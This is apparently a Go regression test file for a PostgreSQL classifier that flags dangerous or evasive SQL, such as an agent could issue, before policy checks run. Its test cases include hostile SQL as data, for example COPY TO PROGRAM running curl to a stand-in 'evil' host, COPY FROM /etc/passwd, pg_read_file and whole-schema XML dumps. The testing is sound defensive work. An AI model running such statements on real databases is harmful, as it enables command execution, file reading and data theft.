package pgsql

import (
	"reflect"
	"strings"
	"testing"

	"fortik/internal/action"
)

// Regression tests for the adversarial review findings.

func classify1(t *testing.T, sql string) Statement {
	t.Helper()
	sts, err := Classify(sql)
	if err != nil {
		t.Fatalf("%s: %v", sql, err)
	}
	if len(sts) != 1 {
		t.Fatalf("%s: got %d statements", sql, len(sts))
	}
	return sts[0]
}

// Built-ins that execute SQL passed as a string must be flagged: the
// classifier cannot see what the string does.
func TestSQLTextFunctionsAreDangerous(t *testing.T) {
	cases := []struct {
		sql  string
		want []string
	}{
		{"SELECT ts_stat('SELECT to_tsvector(pg_read_file(''PG_VERSION''))')", []string{"ts_stat"}},
		{"SELECT * FROM ts_stat('SELECT v FROM docs', 'ab')", []string{"ts_stat"}},
		{"SELECT pg_catalog.ts_stat('SELECT to_tsvector(pg_cancel_backend(0)::text)')", []string{"ts_stat"}},
		{"SELECT ts_rewrite('a & b'::tsquery, 'SELECT t, s FROM aliases')", []string{"ts_rewrite"}},
		{"SELECT x FROM t WHERE y IN (SELECT ts_rewrite(q, 'SELECT 1'))", []string{"ts_rewrite"}},
		{"SELECT query_to_xmlschema('DELETE FROM t RETURNING *', true, false, '')", []string{"query_to_xmlschema"}},
		{"SELECT query_to_xml_and_xmlschema('select 1', true, false, '')", []string{"query_to_xml_and_xmlschema"}},
		// These read every table of a schema / the database while naming none.
		{"SELECT schema_to_xml('pii', true, false, '')", []string{"schema_to_xml"}},
		{"SELECT database_to_xml(true, false, '')", []string{"database_to_xml"}},
		{"SELECT schema_to_xml_and_xmlschema('pii', true, false, '')", []string{"schema_to_xml_and_xmlschema"}},
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		if s.StatementType != TypeDangerousFunction || s.Verb != action.VerbExecute || !reflect.DeepEqual(s.DangerousFunctions, c.want) {
			t.Errorf("%s: got %s/%s danger=%q", c.sql, s.StatementType, s.Verb, s.DangerousFunctions)
		}
	}
	// The 3-argument ts_rewrite takes only tsquery values: harmless.
	s := classify1(t, "SELECT ts_rewrite('a & b'::tsquery, 'a'::tsquery, 'c'::tsquery)")
	if s.StatementType != TypeSelect || len(s.DangerousFunctions) != 0 {
		t.Errorf("3-arg ts_rewrite: %s %q", s.StatementType, s.DangerousFunctions)
	}
}

// A CTE name hides only references inside its own scope.
func TestCTEScopeDoesNotHideRealTables(t *testing.T) {
	cases := []struct {
		sql    string
		tables []string
		table  string
	}{
		{"SELECT * FROM secrets WHERE EXISTS (WITH secrets AS (SELECT 1) SELECT 1 FROM secrets)", []string{"public.secrets"}, "secrets"},
		{"COPY (SELECT * FROM secrets WHERE EXISTS (WITH secrets AS (SELECT 1) SELECT 1 FROM secrets)) TO STDOUT", []string{"public.secrets"}, "secrets"},
		// Non-recursive WITH: a CTE body cannot see its own name, so this
		// reads the real table.
		{"WITH secrets AS (SELECT * FROM secrets) SELECT * FROM secrets", []string{"public.secrets"}, "secrets"},
		// A later sibling's name is not visible to an earlier sibling.
		{"WITH a AS (SELECT * FROM b), b AS (SELECT 1) SELECT * FROM a", []string{"public.b"}, "b"},
		// Earlier siblings are visible to later ones.
		{"WITH a AS (SELECT 1), b AS (SELECT * FROM a) SELECT * FROM b", []string{}, ""},
		// Recursive self-reference is a CTE reference.
		{"WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * FROM r", []string{}, ""},
		{"WITH x AS (SELECT 1) SELECT * FROM x", []string{}, ""},
		{"WITH x AS (SELECT 1) SELECT * FROM x UNION SELECT * FROM x", []string{}, ""},
		// A DML target is always a real relation, even if a CTE has its name.
		{"WITH t AS (SELECT 1) DELETE FROM t WHERE id = 1", []string{"public.t"}, "t"},
		{"WITH t AS (SELECT 1) INSERT INTO t SELECT * FROM t", []string{"public.t"}, "t"},
		// A qualified name is never a CTE.
		{"WITH secrets AS (SELECT 1) SELECT * FROM public.secrets", []string{"public.secrets"}, "secrets"},
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		if !reflect.DeepEqual(s.Tables, c.tables) || s.Table != c.table {
			t.Errorf("%s: tables=%q table=%q, want %q %q", c.sql, s.Tables, s.Table, c.tables, c.table)
		}
	}
}

// A WHERE whose result can change between the snapshot and the statement
// makes the snapshot unreliable: not preparable, VolatileWhere=true.
func TestVolatileWhereNotPreparable(t *testing.T) {
	cases := []struct {
		sql      string
		volatile bool
	}{
		{"DELETE FROM t WHERE random() < 0.5", true},
		{"DELETE FROM t WHERE id IN (SELECT id FROM t ORDER BY random() LIMIT 5)", true},
		{"DELETE FROM t WHERE id = nextval('s')", true},
		{"UPDATE t SET a = 1 WHERE created_at < clock_timestamp()", true},
		{"DELETE FROM t WHERE id = (SELECT max(id) FROM u TABLESAMPLE BERNOULLI (10))", true},
		{"DELETE FROM t WHERE id IN (SELECT id FROM t LIMIT 10)", true},
		{"DELETE FROM t WHERE id IN (SELECT id FROM q FOR UPDATE SKIP LOCKED)", true},
		{"DELETE FROM t WHERE g = gen_random_uuid()", true},
		{"DELETE FROM t WHERE my_func(id)", true}, // unknown volatility: assume volatile
		{"DELETE FROM t WHERE id = 1", false},
		{"DELETE FROM t WHERE created_at < now() - interval '1 day'", false},
		{"DELETE FROM t WHERE created_at < CURRENT_TIMESTAMP AND lower(email) = $1", false},
		{"DELETE FROM t WHERE id IN (SELECT id FROM u WHERE u.flag)", false},
		{"DELETE FROM t", false},
		{"UPDATE t SET a = random() WHERE id = 3", false}, // only the WHERE matters
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		if s.VolatileWhere != c.volatile || s.SnapshotPreparable() == c.volatile {
			t.Errorf("%s: volatile=%v preparable=%v", c.sql, s.VolatileWhere, s.SnapshotPreparable())
		}
		if c.volatile {
			if _, err := SnapshotSQL(&s, SnapshotSchema, "snap"); err == nil {
				t.Errorf("%s: SnapshotSQL accepted a volatile WHERE", c.sql)
			}
		}
	}
}

// A cast on the column side is not an equality on the column: id::int = 5
// matches many numeric ids.
func TestEqualityColumnsIgnoreCastColumns(t *testing.T) {
	cases := map[string][]string{
		"DELETE FROM t WHERE id::int = 5":                      {},
		"DELETE FROM t WHERE created_at::date = '2024-01-01'":  {},
		"DELETE FROM t WHERE CAST(id AS int) = 5":              {},
		"DELETE FROM t WHERE 5 = id::int":                      {},
		"DELETE FROM t WHERE id = '5'::int AND x::text = 'a'":  {"id"},
		"DELETE FROM t WHERE id = $1::bigint":                  {"id"},
		`DELETE FROM t WHERE name COLLATE "C" = 'x' AND k = 1`: {"k"},
	}
	for sql, want := range cases {
		s := classify1(t, sql)
		if !reflect.DeepEqual(s.WhereEqualityColumns, want) {
			t.Errorf("%s: eq=%q want %q", sql, s.WhereEqualityColumns, want)
		}
	}
}

// Statements stored in a rule or a function body do not run now: the
// statement stays DDL_CREATE.
func TestStoredBodiesDoNotReplaceDDL(t *testing.T) {
	cases := []struct {
		sql    string
		tables []string
	}{
		{"CREATE RULE r AS ON INSERT TO audit DO ALSO DELETE FROM accounts WHERE id = 1", []string{"public.audit", "public.accounts"}},
		{"CREATE OR REPLACE RULE r AS ON UPDATE TO audit DO INSTEAD (UPDATE accounts SET a = 1; INSERT INTO log VALUES (1))", nil},
		{"CREATE FUNCTION f() RETURNS void LANGUAGE sql BEGIN ATOMIC DELETE FROM accounts WHERE id = 1; END", nil},
		{"CREATE PROCEDURE p() LANGUAGE sql BEGIN ATOMIC UPDATE accounts SET a = 1; END", nil},
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		if s.StatementType != TypeDDLCreate || s.Verb != action.VerbWrite || s.DML != nil || s.HasWhere {
			t.Errorf("%s: got %s/%s dml=%v where=%v", c.sql, s.StatementType, s.Verb, s.DML != nil, s.HasWhere)
		}
		if c.tables != nil && !reflect.DeepEqual(s.Tables, c.tables) {
			t.Errorf("%s: tables %q want %q", c.sql, s.Tables, c.tables)
		}
		if !contains(s.Tables, "public.accounts") {
			t.Errorf("%s: body tables not listed: %q", c.sql, s.Tables)
		}
	}
	// A dangerous call stored in a body still escalates: creating it is how
	// an agent would hide the call behind an opaque function later.
	s := classify1(t, "CREATE FUNCTION f() RETURNS bool LANGUAGE sql BEGIN ATOMIC SELECT pg_terminate_backend(1); END")
	if s.StatementType != TypeDangerousFunction {
		t.Errorf("dangerous body: %s", s.StatementType)
	}
}

func contains(l []string, s string) bool {
	for _, x := range l {
		if x == s {
			return true
		}
	}
	return false
}

// normalized_sql must never carry literals, whatever node they sit in.
func TestNormalizedRedactsAllLiterals(t *testing.T) {
	cases := []struct {
		sql    string
		secret []string
	}{
		{"COMMENT ON TABLE t IS 'ssn 123-45-6789'", []string{"123-45-6789", "ssn"}},
		{"CREATE RULE r AS ON INSERT TO audit DO ALSO DELETE FROM accounts WHERE id = 4242 AND name = 'alice'", []string{"4242", "alice"}},
		{"CREATE FUNCTION f() RETURNS int LANGUAGE sql BEGIN ATOMIC SELECT 98765 + length('bob@x'); END", []string{"98765", "bob@x"}},
		{"COPY t FROM '/etc/passwd'", []string{"/etc/passwd"}},
		{"COPY t TO PROGRAM 'curl http://evil'", []string{"evil"}},
		{"DO $$ BEGIN PERFORM 'carol@example.com'; END $$", []string{"carol"}},
		{"SECURITY LABEL ON TABLE t IS 'top secret'", []string{"top secret"}},
		{"SELECT E'\\x41dave', B'1010', X'1F', U&'d\\0061ta', 1.5e3", []string{"dave", "1010", "1F", "d\\0061ta", "1.5e3"}},
		{"DELETE FROM customers WHERE email = 'eve@example.com' AND id = $1", []string{"eve"}},
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		for _, sec := range c.secret {
			if strings.Contains(s.Normalized, sec) {
				t.Errorf("%s: normalized leaks %q: %s", c.sql, sec, s.Normalized)
			}
		}
		if strings.Contains(s.Normalized, "'") {
			t.Errorf("%s: normalized still has a quote: %s", c.sql, s.Normalized)
		}
	}
	// Existing $n parameters are kept and new placeholders do not reuse them.
	s := classify1(t, "COMMENT ON TABLE t IS 'x'")
	if s.Normalized != "COMMENT ON TABLE t IS $1" {
		t.Errorf("got %q", s.Normalized)
	}
}

// DROP SCHEMA exposes the schema so schema-level data label rules apply.
func TestSchemaLevelTargets(t *testing.T) {
	cases := []struct {
		sql    string
		schema string
		tables []string
	}{
		{"DROP SCHEMA pii CASCADE", "pii", []string{"pii.*"}},
		{"DROP SCHEMA IF EXISTS a, \"B\"", "a", []string{"a.*", "B.*"}},
		{"GRANT SELECT ON ALL TABLES IN SCHEMA pii TO bob", "pii", []string{"pii.*"}},
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		if s.Schema != c.schema || s.Table != "" || !reflect.DeepEqual(s.Tables, c.tables) {
			t.Errorf("%s: schema=%q table=%q tables=%q", c.sql, s.Schema, s.Table, s.Tables)
		}
	}
	s := classify1(t, "DROP DATABASE prod_db")
	if s.Database != "prod_db" || s.StatementType != TypeDropDatabase {
		t.Errorf("drop database: %q %s", s.Database, s.StatementType)
	}
}

// Contract additions read by the Rego policy.
func TestContractFacts(t *testing.T) {
	cases := []struct {
		sql         string
		onConflict  bool
		mergeDelete bool
	}{
		{"INSERT INTO t VALUES (1) ON CONFLICT (id) DO UPDATE SET v = excluded.v", true, false},
		{"INSERT INTO t VALUES (1) ON CONFLICT ON CONSTRAINT t_pkey DO UPDATE SET v = 2 WHERE t.v < 2", true, false},
		{"INSERT INTO t VALUES (1) ON CONFLICT DO NOTHING", false, false},
		{"INSERT INTO t VALUES (1)", false, false},
		{"WITH i AS (INSERT INTO t VALUES (1) ON CONFLICT (id) DO UPDATE SET v = 1 RETURNING *) SELECT * FROM i", true, false},
		{"MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE", false, true},
		{"MERGE INTO t USING s ON t.id = s.id WHEN MATCHED AND s.x THEN UPDATE SET v = s.v WHEN MATCHED THEN DELETE WHEN NOT MATCHED THEN INSERT VALUES (s.id)", false, true},
		{"MERGE INTO t USING s ON t.id = s.id WHEN NOT MATCHED BY SOURCE THEN DELETE", false, true},
		{"MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN UPDATE SET v = s.v WHEN NOT MATCHED THEN INSERT VALUES (s.id)", false, false},
		{"MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DO NOTHING", false, false},
	}
	for _, c := range cases {
		s := classify1(t, c.sql)
		if s.OnConflictUpdate != c.onConflict || s.MergeHasDelete != c.mergeDelete {
			t.Errorf("%s: on_conflict_update=%v merge_has_delete=%v", c.sql, s.OnConflictUpdate, s.MergeHasDelete)
		}
	}
	if s := classify1(t, "MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE"); s.StatementType != TypeMerge || s.Verb != action.VerbWrite {
		t.Errorf("MERGE with DELETE must stay MERGE/WRITE: %s/%s", s.StatementType, s.Verb)
	}
}
